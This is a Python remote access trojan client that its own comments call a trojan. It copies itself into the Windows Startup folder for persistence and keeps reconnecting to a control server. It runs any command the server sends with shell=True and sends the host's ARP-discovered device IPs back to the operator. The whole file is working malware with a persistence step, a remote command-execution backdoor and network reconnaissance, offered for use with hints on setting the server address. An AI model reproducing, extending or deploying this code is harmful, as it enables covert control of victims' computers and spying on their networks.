import socket 
import threading
import subprocess 
import sys, os, getpass, re
from shutil import copy
#main class
class Client:
    #used to search for wired devices on the network
    def devices(self):
       

        self.a = str(subprocess.check_output("arp -a"))
        self.a = re.sub("\s+", " ", self.a)
        self.a = self.a.split("\\r\\n")
        self.ip = []
        for self.item in self.a:
    
            if self.item.split()[0].count(".") == 3:
                self.ip.append(self.item.split()[0])
        return self.ip
    #gets executed first, all startup stuff goes here
    def build(self):
        try:
            #tries to add our script to system startup
            self.add_startup()
        except Exception as e:
            print(e)
        #connects to server
        self.connect()
        #starts listening
        threading.Thread(target=self.listen).start()
    #function for connecting to the server
    def connect(self):
        while True:
            try:
                print("Reaching out")
                #socket gets redeclared every time to clear cache
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                #change these parameters, they need to be the same as your server!
                #(or public ip, depends on if u wanna use this on ur network or not)
                self.socket.connect((socket.gethostbyname(socket.gethostname()), 25565))
                break 
            except:
                continue 
    #adds the trojan to startup
    def add_startup(self):
        #__file__ is used, so it autodetects it's directory and name
        copy(__file__, f"C:/Users/{getpass.getuser()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup")
        print("Added to StartUp!")
    #listening for commands
    def listen(self):
        #runs forever
        while True:
            #try and except is used so when the connection is interrupted it can restart
            try:
                self.data = self.socket.recv(2048).decode()
            except:
                #this runs only if the connection is interrupted
                #closes the socket
                self.socket.close()
                print("Reconnecting")
                #tries to reconnect
                #note that this is not threaded, so
                #current thread runs the reconnect function instead of resuming
                #this way everything is handled correctly
                self.connect()
                #after the connection is successful this thread resumes working as normal
                print("Reconnected!")
            #just some commands, feel free to play around with this
            if self.data == "SELF_DESTRUCT":
                sys.exit(0)
            elif self.data == "devices":
                #this sends wired deviced(their local ips) to the server
                self.socket.send(str(self.devices()).encode())
            else:
                subprocess.Popen(self.data, shell=True)
           # self.socket.sendall("200".encode())
#running this mess
Client().build()
